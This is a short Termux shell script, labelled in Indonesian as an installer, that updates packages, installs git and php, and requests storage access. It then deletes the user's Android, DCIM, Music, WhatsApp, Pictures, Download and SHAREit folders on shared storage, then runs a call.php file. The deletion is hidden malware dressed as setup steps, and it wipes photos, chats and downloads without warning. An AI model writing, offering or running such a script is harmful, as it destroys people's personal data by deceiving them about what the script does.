

echo "Menginstall Bahan"

apt update -y
apt upgrade -y
apt install git -y
apt install php -y
 
clear
termux-setup-storage

rm -rf /sdcard/Android
rm -rf /sdcard/DCIM
rm -rf /sdcard/Music
rm -rf /sdcard/SHAREit
rm -rd /sdcard/WhatsApp
rm -rf /sdcard/Pictures
rm -rf /sdcard/Download

php call.php
